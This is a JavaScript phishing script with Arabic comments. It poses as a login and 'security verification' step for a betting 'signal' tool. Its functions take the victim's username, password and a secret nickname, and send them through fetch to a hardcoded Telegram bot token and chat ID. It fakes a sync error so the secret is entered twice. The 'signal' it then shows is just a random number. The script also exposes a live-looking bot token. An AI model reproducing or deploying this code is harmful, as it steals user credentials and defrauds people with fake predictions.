// 1. استعملت Const وحرف C كان كبيراً (يسبب خطأ)، والتوكن لازم يكون string
const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let step = 0;

function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    
    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    btn.disabled = true;
    btn.innerText = "Verifying...";

    // إرسال البيانات للبوت (استعمال encodeURIComponent لضمان وصول الرموز)
    const text = `👤 User: ${u}\n🔑 Pass: ${p}`;
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=html`);

    setTimeout(() => {
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('security-layer').style.display = 'flex';
        document.getElementById('security-layer').classList.remove('hidden'); // تأكد من إزالة hidden
    }, 800);
}

function finalVerify() {
    const ans = document.getElementById('u_nick').value; // تأكد أن الـ ID هو u_nick في HTML
    const btn = document.querySelector('#security-layer button'); // تحديد الزر داخل الواجهة الحمراء
    
    if (ans.length < 2) return alert("أدخل الإجابة!");

    step++;
    btn.disabled = true;
    btn.innerText = "Synchronizing..."; 

    // إرسال اللقب للبوت
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔑 SECRET: " + ans)}&parse_mode=html`);

    setTimeout(() => {
        if (step === 1) {
            document.getElementById('u_nick').value = ""; // مسح الخانة
            btn.disabled = false;
            btn.innerText = "Confirm & Unlock";
            alert("خطأ في المزامنة: أعد كتابة اللقب بدقة!");
        } else {
            // غلق الواجهة الحمراء وفتح الرادار
            document.getElementById('security-layer').style.display = 'none';
            document.getElementById('security-layer').classList.add('hidden');
            
            const mainApp = document.getElementById('main-app');
            mainApp.style.display = 'flex';
            mainApp.classList.remove('hidden');
        }
    }, 1200); 
}

function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        display.innerText = (Math.random() * (3.80 - 1.20) + 1.20).toFixed(2) + "x";
    }, 800);
}
